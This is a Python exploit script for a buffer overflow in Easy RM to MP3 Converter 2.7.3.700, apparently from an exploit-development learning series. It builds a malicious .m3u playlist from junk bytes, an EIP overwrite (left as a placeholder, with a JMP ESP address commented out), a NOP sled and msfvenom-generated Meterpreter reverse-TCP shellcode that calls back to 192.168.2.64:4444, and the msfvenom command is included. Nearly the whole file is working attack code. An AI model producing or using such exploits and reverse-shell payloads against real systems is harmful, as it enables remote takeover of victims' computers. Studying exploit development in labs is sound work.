######################################################### 

##      Easy RM to MP3 Converter Buffer Overflow       ## 

##            Ver 2.7.3.700 29 Sept 2006               ##       

##                  Exploit V-06                       ## 

######################################################### 

### Initialize a large variable 'junk' to overflow the buffer with 26049 A's 
junk = '\x41' * 26049 # 26049 26057 

### Initialize a new variable EIP 
### Jmp ESP found at 01aaf23a = \x01\xAA\xF2\x3A -> '\x3A\xF2\xAA\x01' 
### !mona find -s "\xff\xe4" -m MSRMCcodec02.dll 
#eip = '\x3A\xF2\xAA\x01' # '\x42' * 4 
eip = '\x42' * 4 

### Initialize a new variable nops, to create a landing area. 
nops = '\x90' * 40 

### Initialize variable buf to hold shell code 
### msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.64 LPORT=4444 -e x86/shikata_ga_nai -b '\x00\x0a' -f python 
buf =  b"" 
buf += b"\xd9\xc3\xba\x27\x8a\x89\xb9\xd9\x74\x24\xf4\x5e\x33" 
buf += b"\xc9\xb1\x56\x31\x56\x18\x03\x56\x18\x83\xc6\x23\x68" 
buf += b"\x7c\x45\xc3\xee\x7f\xb6\x13\x8f\xf6\x53\x22\x8f\x6d" 
buf += b"\x17\x14\x3f\xe5\x75\x98\xb4\xab\x6d\x2b\xb8\x63\x81" 
buf += b"\x9c\x77\x52\xac\x1d\x2b\xa6\xaf\x9d\x36\xfb\x0f\x9c" 
buf += b"\xf8\x0e\x51\xd9\xe5\xe3\x03\xb2\x62\x51\xb4\xb7\x3f" 
buf += b"\x6a\x3f\x8b\xae\xea\xdc\x5b\xd0\xdb\x72\xd0\x8b\xfb" 
buf += b"\x75\x35\xa0\xb5\x6d\x5a\x8d\x0c\x05\xa8\x79\x8f\xcf" 
buf += b"\xe1\x82\x3c\x2e\xce\x70\x3c\x76\xe8\x6a\x4b\x8e\x0b" 
buf += b"\x16\x4c\x55\x76\xcc\xd9\x4e\xd0\x87\x7a\xab\xe1\x44" 
buf += b"\x1c\x38\xed\x21\x6a\x66\xf1\xb4\xbf\x1c\x0d\x3c\x3e" 
buf += b"\xf3\x84\x06\x65\xd7\xcd\xdd\x04\x4e\xab\xb0\x39\x90" 
buf += b"\x14\x6c\x9c\xda\xb8\x79\xad\x80\xd4\x4e\x9c\x3a\x24" 
buf += b"\xd9\x97\x49\x16\x46\x0c\xc6\x1a\x0f\x8a\x11\x2b\x07" 
buf += b"\x2d\xcd\x93\x48\xd3\xee\xe3\x41\x10\xba\xb3\xf9\xb1" 
buf += b"\xc3\x58\xfa\x3e\x16\xf4\xf0\xa8\x59\xa0\x07\x69\x32" 
buf += b"\xb2\x07\x78\x9e\x3b\xe1\x2a\x4e\x6b\xbe\x8a\x3e\xcb" 
buf += b"\x6e\x63\x55\xc4\x51\x93\x56\x0f\xfa\x3e\xb9\xf9\x52" 
buf += b"\xd7\x20\xa0\x29\x46\xac\x7f\x54\x48\x26\x75\xa8\x07" 
buf += b"\xcf\xfc\xba\x70\xa8\xfe\x42\x81\x5d\xfe\x28\x85\xf7" 
buf += b"\xa9\xc4\x87\x2e\x9d\x4a\x77\x05\x9e\x8d\x87\xd8\x96" 
buf += b"\xe6\xbe\x4e\x96\x90\xbe\x9e\x16\x61\xe9\xf4\x16\x09" 
buf += b"\x4d\xad\x45\x2c\x92\x78\xfa\xfd\x07\x83\xaa\x52\x8f" 
buf += b"\xeb\x50\x8c\xe7\xb3\xab\xfb\x7b\xb3\x53\x79\x54\x1c" 
buf += b"\x3b\x81\xe4\x9c\xbb\xeb\xe4\xcc\xd3\xe0\xcb\xe3\x13" 
buf += b"\x08\xc6\xab\x3b\x83\x87\x1e\xda\x94\x8d\xff\x42\x94" 
buf += b"\x22\x24\x75\xef\x4b\xdb\x76\x10\x42\xb8\x77\x10\x6a" 
buf += b"\xbe\x44\xc6\x53\xb4\x8b\xda\xe7\xc7\xbe\x7f\x41\x42" 
buf += b"\xc0\x2c\x91\x47" 

shell_code = buf 

### Initialize a new  variable padding to preserve the size of 
### the exploit buffer 
padding = '\x43' * (30000 - (len(junk) + len(eip) + len(nops) + len(shell_code))) 

### Build the buffer 
buffer = junk + eip + nops + shell_code + padding 

### Output the contents of the 'buffer' variable to the terminal 
### Use python [exploit_script].py > [version]-exploit.m3u 
print(buffer) 

 
